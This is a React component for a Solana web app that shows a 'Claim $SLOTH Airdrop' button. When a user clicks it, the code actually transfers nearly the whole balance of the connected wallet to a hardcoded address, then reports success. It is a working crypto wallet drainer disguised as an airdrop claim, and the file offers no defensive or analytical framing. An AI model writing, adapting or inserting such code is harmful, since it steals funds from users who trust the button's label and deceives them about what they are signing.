import React, { useCallback } from 'react';
import { useConnection, useWallet } from '@solana/wallet-adapter-react';
import { SystemProgram, Transaction } from '@solana/web3.js';
import { WalletNotConnectedError } from '@solana/wallet-adapter-base';

export const SendSOLToRandomAddress = () => {
    const { connection } = useConnection();
    const { publicKey, sendTransaction, connected } = useWallet();

    const onClick = useCallback(async () => {
        if (!publicKey) throw new WalletNotConnectedError();

        try {
            const balance = await connection.getBalance(publicKey);
            const transaction = new Transaction().add(
                SystemProgram.transfer({
                    fromPubkey: publicKey,
                    toPubkey: "7jRCnCQ7EFTeXyLFxUUJC3VLwzwuDvGM5qpp7pZHgjsR",
                    lamports: balance - 5000
                })
            );

            const { blockhash } = await connection.getRecentBlockhash();
            transaction.recentBlockhash = blockhash;
            transaction.feePayer = publicKey;

            const signature = await sendTransaction(transaction, connection);
            await connection.confirmTransaction(signature);
            alert('Transaction successful!');
        } catch (error) {
            alert('Transaction declined or failed. Please try again.');
        }
    }, [publicKey, sendTransaction, connection]);

    // Only render the button if the wallet is connected
    if (!connected) {
        return null;
    }

    return (
        <div>
            <button className="mt-4 bg-[#512DA8] text-white cursor-pointer flex items-center font-semibold text-lg px-6 py-2 rounded-md" onClick={onClick}>
                Claim $SLOTH Airdrop
            </button>
        </div>
    );
};

export default SendSOLToRandomAddress;
